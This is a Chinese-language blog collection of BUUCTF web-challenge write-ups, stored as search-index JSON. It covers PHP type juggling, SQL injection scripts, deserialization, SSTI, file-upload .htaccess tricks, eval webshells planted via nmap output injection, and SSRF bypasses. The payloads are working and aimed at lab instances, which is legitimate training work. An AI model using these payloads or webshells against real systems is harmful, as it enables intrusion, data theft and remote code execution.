threads.append(t) t.start() 虽然不知道多整几个能用的值可以干什么，但是觉得自己写的程序跑出来答案就很爽🤣。 还有一个能用的md5值： content: 129581926211651571912466741651878684928 hex: 06da5430449f8f6f23dfc1276f722738 raw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1'or'8 string: T0Do#'or'8 以上是第一层。其实看了源码里只验证了字符串是否等于ffifdyop我写的脚本里的值肯定通过不了 第二层可以直接在源码中看到注释。 $a = $GET['a']; $b = $_GET['b']; if($a != $b \u0026\u0026 md5($a) == md5($b)){ // wow, glzjin wants a girl friend. 简单的md5以0E开头 a=QNKCDZO\u0026b=240610708 第三层 \u003c?php error_reporting(0); include \"flag.php\"; highlight_file(__FILE__); if($_POST['param1']!==$_POST['param2']\u0026\u0026md5($_POST['param1'])===md5($_POST['param2'])){ echo $flag; } 这一有一些不同的是md5比较使用了===不仅比较类型还比较值。但是md5有一个： md5([1,2,3]) == md5([4,5,6]) == NULL 所以传入两个数组，又能保证两个变量不相等，md5加密有都是NULL且类型是数组类型，注意数组里的值还是不可以一样的。 param1[]=1\u0026param2[]=2 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf2020easy-md5"},{"categories":["CTF"],"content":"[ZJCTF 2019]NiZhuanSiWei源码 \u003c?php $text = $_GET[\"text\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($text)\u0026\u0026(file_get_contents($text,'r')===\"welcome to the zjctf\")){ echo \"\u003cbr\u003e\u003ch1\u003e\".file_get_contents($text,'r').\"\u003c/h1\u003e\u003c/br\u003e\"; if(preg_match(\"/flag/\",$file)){ echo \"Not now!\"; exit(); }else{ include($file); //useless.php $password = unserialize($password); echo $password; } } else{ highlight_file(__FILE__); } ?\u003e 先来一段PHP伪协议总结，这题的第一步是判断传入text参数并读取内容，判断内容为welcome to the zjctf，使用data://伪协议。 ?text=data://text/plain,welcome to the zjctf 接下来是文件包含，有了提示useless.php肯定要读一读看看，使用php://filter伪协议。 ?text=data://text/plain,welcome to the zjctf\u0026file=php://filter/convert.base64-encode/resource=useless.php 得到的内容 \u003c?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-\u003efile)){ echo file_get_contents($this-\u003efile); echo \"\u003cbr\u003e\"; return (\"U R SO CLOSE !///COME ON PLZ\"); } } } ?\u003e 并且文件包含下面有一个反序列化，又看到了__tostring函数，当一个对象被当作字符串对待的时候，会触发这个魔术方法。我构造的对象 \u003c?php class Flag{ public $file=\"flag.php\"; } $f = new Flag(); echo serialize($f); //O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";} 在传入对象之前当然要把读取文件流改为正常包含文件了。最终payload ?text=data://text/plain,welcome to the zjctf\u0026file=useless.php\u0026password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";} ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#zjctf-2019nizhuansiwei"},{"categories":["CTF"],"content":"[CISCN2019 华北赛区 Day2 Web1]Hack World很明显的sql注入，随便尝试一些语句有 1 » Hello, glzjin wants a girlfriend. 2 » Do you want to be my girlfriend? 3之后都是 » Error Occured When Fetch Result. 输入一个单引号1'出现了bool(false)，是一个布尔类型返回，就很有可能是盲注之类的。测试的时候还发现空格被过滤了，空格被过滤可以尝试使用TAB制表符代替。 题目中也有提示 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#ciscn2019-华北赛区-day2-web1hack-world"},{"categories":["CTF"],"content":"All You Want Is In Table ‘flag’ and the column is ‘flag’ 说明flag在flag表的flag字段中。以下是一个布尔盲注的脚本，思路就是查询flag的值使用substr函数每次截取一个字符，获得其ascii值再使用二分法确定具体的值，最后拼接输出。 import requests import time url = 'http://26670c55-697e-4520-ae0a-bd23a786cd72.node3.buuoj.cn/' result = '' for x in range(1, 50): high = 127 low = 32 mid = (low + high) // 2 while high\u003elow: payload = \"if(ascii(substr((select flag from flag),%d,1))\u003e%d,1,2)\" % (x, mid) data = { \"id\":payload } time.sleep(0.3) response = requests.post(url, data = data) if 'Hello' in response.text: low=mid+1 else: high = mid mid = (low+high)/2 result += chr(int(mid)) print(result) #flag{929c8993-2d85-4fbf-8e48-7c457551105e} ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:1","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#all-you-want-is-in-table-flag-and-the-column-is-flag"},{"categories":["CTF"],"content":"[极客大挑战 2019]HardSQL还是sql注入题。尝试在输入框里输入#、--+时被拦下了，但是在url中使用%23通过了。尝试了union但是被过滤了，使用双写也不通过，和这道题同类型的题前面有Baby SQL、Easy SQL，考点还剩下的有盲注、报错注入、堆叠注入。尝试报错注入可以使用，我参考的十种MySQL报错注入。还需要注意空格是会被拦下的，url编码也不能通过，所以在语句中的表名需要使用()隔开，具体payload如下： 爆表 ?username=admin%27or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e)))%23\u0026password=1 当前表名是：H4rDsq1 爆字段 ?username=admin%27or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e)))%23\u0026password=1 当前表的字段有：id,username,password 出数据 如果使用正常的查询语句会因为flag的长度太长，页面中的回显长度不能显示全，但是可以使用left和right函数： 语法：LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH) 这两个函数会用到选取的长度，如果想要拼成一个完整的flag，可以先用length查看总长度，计算以后拼一下 ?username=admin%27or(extractvalue(1,concat(0x7e,(select(left(password,35))from(H4rDsq1)),0x7e)))%23\u0026password=1 flag{112bb5db-17a4-47e2-97b4-19 ?username=admin%27or(extractvalue(1,concat(0x7e,(select(right(password,11))from(H4rDsq1)),0x7e)))%23\u0026password=1 dc295a017f} ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019hardsql"},{"categories":["CTF"],"content":"[网鼎杯 2018]Fakebook是一个展示自己博客网址的列表，先随便注册一个 我填的是baidu的网址23333。这时的url是： http://2cefe2a5-4e68-44ce-870c-3628c2500cd3.node3.buuoj.cn/view.php?no=1 看到了no=1，应该想到了sql注入，我没有试出什么名堂，但是在网上找到了一个这道题的非预期解：[网鼎杯2018]fakebook题解，使用了load_file函数直接读取了flag文件。同样是空格被过滤，但是可以使用/**/绕过。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#网鼎杯-2018fakebook"},{"categories":["CTF"],"content":"非预期解 ?no=-1 union/**/select 1,2,3,4 先使用上面的语句查看回显点。 找的了位置2的回显点，可以把函数替换在2的位置上。 ?no=-1 union/**/select 1,load_file('/var/www/html/flag.php'),3,4 参考师傅的博客中是使用了盲注获得flag的，其实执行以后使用页面的选取工具选取回显的标签块，可以在注释里找的到🤣 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:1:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#非预期解"},{"categories":["CTF"],"content":"预期解正常的sql注入一套查询，同样是使用/**/绕过空格过滤。 爆表 ?no=-1%20union/***/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23 爆字段 ?no=-1 union/***/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users' %23 出数据 ?no=-1 union/***/select 1,group_concat(no,username,passwd,data),3,4 from users 查询的结果是一大串字符串，但是在结尾一个PHP的序列化对象： O:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"guobang\";s:3:\"age\";i:18;s:4:\"blog\";s:20:\"http://www.baidu.com\";} 说明网站是使用反序列化获取对应栏的数据，下面有一个iframe的标签，根据提示the contents of his/her blog，得知我们提供的网址会在这里显示，正好有一个php伪协议file://可以读取本地文件，思路就是：使用伪协议读取flag作为blog网站回显在iframe的标签中，所以构造一个序列化对象。 \u003c?php class UserInfo { public $name = \"guobang\"; public $age = 18; public $blog = \"file:///var/www/html/flag.php\"; } $s = new UserInfo(); echo serialize($s); //O:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"guobang\";s:3:\"age\";i:18;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";} 最终payload ?no=-1%20union/***/select%201,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:7:\"guobang\";s:3:\"age\";i:18;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}' from%20users 在iframe里面找，是一个data:text/html的数据格式，base64加密的噢。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:2:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#预期解"},{"categories":["CTF"],"content":"[网鼎杯 2020 青龙组]AreUSerialz部分图 最下面有对于payload的限制： function is_valid($s) { for($i = 0; $i \u003c strlen($s); $i++) if(!(ord($s[$i]) \u003e= 32 \u0026\u0026 ord($s[$i]) \u003c= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } 需要payload中的字符ascii码值大于32小于125。注意到最后有一个unserialize函数，判断这道题考点是反序列化。接下来分析源码： process()函数判断op的值，如果是1就写入文件，如果是2就读取文件。代码开头包含了flag.php文件，所以推测需要使用2操作数读取flag.php文件。 write()把对象中的$content属性值写入到$filename文件中，如果长度大于100会被拦下。 read()使用**file_get_contents()**函数读取文件。正是我们想要的。 output()输出内容。 __destruct()对象销毁时会执行的函数，需要注意的是if判断里的$this-\u003eop === \"2\"是强比较，并且会修改op的值为1（写文件），因为**“2”是一个字符串类型的如果传入整型的2**即可绕过。 所以我们构造一个对象op为2，filename为flag.php即可，读文件的时候肯定不是 接下来是反序列化时会遇到的问题，因为对象中属性的修饰是protected，序列化时需要保证一致的。 先给出自己创建的对象源码 \u003c?php class FileHandler { protected $op=2; protected $filename=\"/var/www/html/flag.php\"; protected $content; } $c = new FileHandler(); echo serialize($c); PHP7.1以上版本对属性类型不敏感、用public绕过: O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:22:\"/var/www/html/flag.php\";s:7:\"content\";N;} 运行以后可以在网页注释中找到文件。绝对路径读取也可以，我第一次使用php://filter读再去解码也成功了。 O:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:52:\"php://filter/convert.base64-encode/resource=flag.php\";s:7:\"content\";N;} 序列化字符串中s替换为S，支持字符串用16进制， O:11:\"FileHandler\":3:{S:5:\"\\00*\\00op\";i:2;S:11:\"\\00*\\00filename\";S:22:\"/var/www/html/flag.php\";S:10:\"\\00*\\00content\";N;} 思路：https://blog.csdn.net/Oavinci/article/details/106998738 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#网鼎杯-2020-青龙组areuserialz"},{"categories":["CTF"],"content":"[MRCTF2020]你传你🐎呢测试后缀，php、phtml都被过滤了，htaccess可以，先传上特供的.htaccess SetHandler application/x-httpd-php 传图片马，我一直用的是GIF马，几次尝试都没通过，后来修改了Content-Type: image/jpeg可以了，说明Content-Type是GIF还不行，接下来直接传图片码 根据地址访问图片马的地址，使用system读文件还没成，用蚁剑连了执行执行ret=127,disable_function了 不过根目录下的flag文件还是可以正常读取，至于disable_function可以参考【极客大挑战 2019】RCE ME。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#mrctf2020你传你呢"},{"categories":["CTF"],"content":"[BJDCTF 2nd]fake google就一个输入框，随便输入一个去看看，跳转以后 注释里有提示ssti，应该是模板注入，就在网上搜一个ssti的payload试试SSTI (服务器模板注入) 找到了一个直接读文件的payload ?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/flag', 'r').read() }}{% endif %}{% endfor %} ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#bjdctf-2ndfake-google"},{"categories":["CTF"],"content":"[GYCTF2020]Blacklistsql注入，先试一试堆叠注入，可以执行，尝试select的时候返回了过滤内容 return preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject); 前面还有一个堆叠注入的是新姿势**[强网杯 2019]随便注**，一种是使用prepare预处理语句，另一种是修改表名，根据上面的过滤内容，两种方法都被过滤了。先试试查看表： -1';show tables; FlagHere words 查看表结构： -1';desc `FlagHere`; 接下来是看的wp，学到了个新姿势：使用HANDLER ... OPEN语句，贴一个官方文档。 HANDLER ... OPEN语句打开一个表，使其可以使用后续HANDLER ... READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER ... CLOSE或会话终止之前不会关闭 -1';handler FlagHere open;handler FlagHere read first;handler FlagHere close ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gyctf2020blacklist"},{"categories":["CTF"],"content":"[强网杯 2019]高明的黑客下载源码以后一堆不可读的源码，但是里面有很多shell，看不懂所以找了wp，思路就是用脚本匹配文件中的shell，然后传参试一试每一个shell是否能用，抄脚本 # codeing = utf-8 import requests import os import re import threading import time requests.adapters.DEFAULT_RETRIES = 8 session = requests.session() session.keep_alive = False sem=threading.Semaphore(30) url=\"http://84fa677d-e4dd-47a1-9124-1823cc996d12.node3.buuoj.cn/\" path = \"D:\\DROPS\\phpstudy_pro\\WWW\\ctf\\src\\\\\" fileNames = os.listdir(path) rrGET = re.compile(r\"\\$_GET\\[\\'(\\w+)\\'\\]\") rrPOST = re.compile(r\"\\$_POST\\[\\'(\\w+)\\'\\]\") local_file = open(\"flag.txt\",\"w\",encoding=\"utf-8\") def run(fileName): with sem: file = open(path+fileName,'r',encoding='utf-8') content = file.read() print(\"[+]checking: %s\"%fileName) #GET for i in rrGET.findall(content): r = session.get(url+\"%s?%s=%s\"%(fileName,i,\"echo ~guobanghhh~\")) if \"~guobanghhh~\" in r.text: flag = fileName + \"中的\" + i + \"可以用！！！\" print(flag) local_file.write(flag) #POST # for i in rrPOST.findall(content): # r = session.post(url+fileName,data={i:\"echo ~guobanghhh~\"}) # if \"~guobanghhh~\" in r.text: # flag = fileName + \"中的\" + i + \"可以用！！！\" # print(flag) # local_file.write(flag) if __name__ == '__main__': run(\"xk0SzyKwfzw.php\") start_time = time.time() # 开始时间 print(\"[start]程序开始:\" + str(start_time)) thread_list = [] for fileName in fileNames: t = threading.Thread(target=run,args=(fileName,)) thread_list.append(t) for t in thread_list: t.start() for t in thread_list: t.join() 结果就是访问 http://dd1c66d5-66b2-4b82-a2a8-bf7bfbecdd97.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag 获得flag ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#强网杯-2019高明的黑客"},{"categories":["CTF"],"content":"[MRCTF2020]Ez_bypass不截图了，主页没有代码格式，贴一个源码 I put something in F12 for you include 'flag.php'; $flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; if(isset($_GET['gg'])\u0026\u0026isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) \u0026\u0026 $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo \"can you think twice??\"; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); } } else { echo \"You are not a real hacker!\"; } } else{ die('Please input first'); } }Please input first 分析一波： 第7行是第一层需要md5的值相同但是两个变量不同，需要注意是强比较===噢。 第11、17行判断passwd是非数字并且若比较==等于1234567 第一个利用数组即可绕过 md5([1,2,3]) == md5([4,5,6]) == NULL 第二个利用比较时会进行类型转换，字符串1234567a会被强制转换类型为整型的1234567 payload ?id[]=1\u0026gg[]=2 POST passwd=1234567a ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#mrctf2020ez_bypass"},{"categories":["CTF"],"content":"[BUUCTF 2018]Online Tool源码 \u003c?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR']; } if(!isset($_GET['host'])) { highlight_file(__FILE__); } else { $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host); } 最后有一个system函数，但是使用的nmap的指令，经过一番搜索得知了nmap可以把结果存储在文件里，所以这道题也是道RCE。还有两个没见过的函数escapeshellarg、escapeshellcmd。 这道题利用了两个点 nmap可以将扫描的结果存储在文件里。使用方法：Nmap扫描结果的保存和输出 escapeshellarg+escapeshellcmd同时使用有一些漏洞 谈谈escapeshellarg参数绕过和注入的问题 PHP escapeshellarg()+escapeshellcmd() 之殇 参考博客整理一下这两个处理命令的函数同时使用时的问题： 假如传入的参数为172.17.0.2' -v -d a=1 首先经过escapeshellarg函数，这个函数会把单独的单引号'加上转义符\\并使用单引号'括起来，再使用单引号'把整个参数括起来。这时候的参数是'172.17.0.2'\\'' -v -d a=1' 再进入escapeshellcmd函数，这个函数（从左至右会把落单的符号直接加转义符，其他什么都不做）遇到成对匹配的单引号'不过处理，转义符\\再使用转义符转义，再略过一个成对的单引号''，最后一个单引号'再使用转义符转义。这时候的参数就成了'172.17.0.2'\\\\'' -v -d a=1\\' 最后执行的参数是'172.17.0.2'\\\\'' -v -d a=1\\'，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白符。所以可以简化为 172.17.0.2\\ -v -d a=1' 所以构造payload： '\u003c?php eval($_POST[_]) ?\u003e -oG 1.php ' 经过escapeshellarg函数会被解析成为：''\\''\u003c?php eval($_POST[_]) ?\u003e -oG 1.php '\\''' 再经过escapeshellcmd函数会被解析为：''\\\\''\u003c?php eval($_POST[_]) ?\u003e -oG 1.php '\\\\''' 注意最后单引号前面的那个空格很重要，如果是紧挨着的话文件名称就成了1.php\\不在是php文件了。所以我们的payload最终在服务器端是：\\\u003c?php eval($_POST[_]) ?\u003e -oG 1.php \\ 。 加空格目的是为了防止文件名后缀中出现符号，加上空格就会舍去。 \u003c?php $host = \"'\u003c?php eval($_POST[_]) ?\u003e -oG 1.php '\"; echo $host.\"\\n\"; $host = escapeshellarg($host); echo $host.\"\\n\"; $host = escapeshellcmd($host); echo $host.\"\\n\"; 结果： '\u003c?php eval() ?\u003e -oG 1.php ' ''\\''\u003c?php eval() ?\u003e -oG 1.php '\\''' ''\\\\''\\\u003c\\?php eval\\(\\) \\?\\\u003e -oG 1.php '\\\\''' 最终请求payload /?host='\u003c?php eval($_POST[_]) ?\u003e -oG 1.php ' 执行指令时会创建一个sandbox文件夹，访问$sandbox$/1.php，POST传参 _=system('cat /flag'); ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#buuctf-2018online-tool"},{"categories":["CTF"],"content":"[RoarCTF 2019]Easy Java是java写的web程序 考点是WEB-INF/web.xml泄露 WEB-INF主要包含一下文件或目录: /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 重点不在登陆界面，而是那个Help按钮，可以下载文件。 首先尝试去读web.xml文档，添加POST请求 filename=WEB-INF/web.xml 可以读取web.xml文件： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cweb-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\"\u003e \u003cwelcome-file-list\u003e \u003cwelcome-file\u003eIndex\u003c/welcome-file\u003e \u003c/welcome-file-list\u003e \u003cservlet\u003e \u003cservlet-name\u003eIndexController\u003c/servlet-name\u003e \u003cservlet-class\u003ecom.wm.ctf.IndexController\u003c/servlet-class\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003cservlet-name\u003eIndexController\u003c/servlet-name\u003e \u003curl-pattern\u003e/Index\u003c/url-pattern\u003e \u003c/servlet-mapping\u003e \u003cservlet\u003e \u003cservlet-name\u003eLoginController\u003c/servlet-name\u003e \u003cservlet-class\u003ecom.wm.ctf.LoginController\u003c/servlet-class\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003cservlet-name\u003eLoginController\u003c/servlet-name\u003e \u003curl-pattern\u003e/Login\u003c/url-pattern\u003e \u003c/servlet-mapping\u003e \u003cservlet\u003e \u003cservlet-name\u003eDownloadController\u003c/servlet-name\u003e \u003cservlet-class\u003ecom.wm.ctf.DownloadController\u003c/servlet-class\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003cservlet-name\u003eDownloadController\u003c/servlet-name\u003e \u003curl-pattern\u003e/Download\u003c/url-pattern\u003e \u003c/servlet-mapping\u003e \u003cservlet\u003e \u003cservlet-name\u003eFlagController\u003c/servlet-name\u003e \u003cservlet-class\u003ecom.wm.ctf.FlagController\u003c/servlet-class\u003e \u003c/servlet\u003e \u003cservlet-mapping\u003e \u003cservlet-name\u003eFlagController\u003c/servlet-name\u003e \u003curl-pattern\u003e/Flag\u003c/url-pattern\u003e \u003c/servlet-mapping\u003e \u003c/web-app\u003e 注意到了一个FlagController的控制器，它所在的类为com.wm.ctf.FlagController，前面也提到了编译文件所在的文件夹/WEB-INF/classes/，去这个文件夹下载FlagController相关的文件，还需要知道的是：Javaweb程序编译文件的目录结构是根据类名创建的，类名我们也知道了，所以下载： filename=WEB-INF/classes/com/wm/ctf/FlagController.class class文件源码好多不可见字符 我选中的那段就是flag在的地方，看到了==就应该意识到是base64编码，但是base64编码里没有\u003c这个字符，所以flag的密文就是 ZmxhZ3s0NmNhMTExMS01ZjI5LTQwYjMtYjUwMC1lYWMzZjkyMjU4ODF9Cg== ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#roarctf-2019easy-java"},{"categories":["CTF"],"content":"———————–以下部分施工中👷‍♂️————————下面的都是没有整理，先把重要思路写下来了，然后有时间再配图 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#-----------------------以下部分施工中------------------------"},{"categories":["CTF"],"content":"[GKCTF2020]cve版签到CVE-2020-7066 只有一个按钮，点击以后查看网页的Network请求中有一个 Hint: Flag in localhost 且utl地址中有可控的参数，所以应该是使用ssrf。这里还有一个提示是在主页面那里 You just view *.ctfhub.com 只可以访问以ctfhub.com结尾的网站，再根据cve使用%00截断访问： ?url=http://127.0.0.1%00.ctfhub.com 第二个提示： Host must be end with ‘123’ 必须以123结尾，所以最终payload ?url=http://127.0.0.123%00.ctfhub.com ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gkctf2020cve版签到"},{"categories":["CTF"],"content":"[GXYCTF2019]禁止套娃git泄露。我使用的https://github.com/gakki429/Git_Extract \u003c?php include \"flag.php\"; echo \"flag在哪里呢？\u003cbr\u003e\"; if(isset($_GET['exp'])){ if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) { if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) { if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) { // echo $_GET['exp']; @eval($_GET['exp']); } else{ die(\"还差一点哦！\"); } } else{ die(\"再好好想想！\"); } } else{ die(\"还想读flag，臭弟弟！\"); } } // highlight_file(__FILE__); ?\u003e 正则表达式匹配的只有函数的形式如var_dump();是一道无参数RCE，看的题解自己整理的payload： ?exp=var_dump(readfile(array_rand(array_flip(scandir(current(localeconv())))))); 一层一层解释： localeconv() 函数返回一包含本地数字及货币格式信息的数组 图片展示 current() 返回数组中的当前单元, 默认取第一个值。别名pos() 到这里获得的是一个点 scandir() 遍历目录，是.的话就是列出当前目录。 此时输出： array(5) { [0]=\u003e string(1) \".\" [1]=\u003e string(2) \"..\" [2]=\u003e string(4) \".git\" [3]=\u003e string(8) \"flag.php\" [4]=\u003e string(9) \"index.php\" } 这时的输出还是键值对的形式，我们需要使用array_flip()函数交换键值对，然后使用随机函数array_rand()从数组中随机取出一个或多个单元。因为正则的原因无法使用file_get_contents()，但是还有其他读取文件的函数:readfile()、highlight_file()和它的别名函数show_source()。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gxyctf2019禁止套娃"},{"categories":["CTF"],"content":"[GXYCTF2019]BabyUploadph过滤，image/gif不能通过。image/jpe可以 上传.htaccess SetHandler application/x-httpd-php 上传码，但是不能是php代码，使用js \u003cscript language=\"php\"\u003eeval($_REQUEST[shell])\u003c/script\u003e 完工 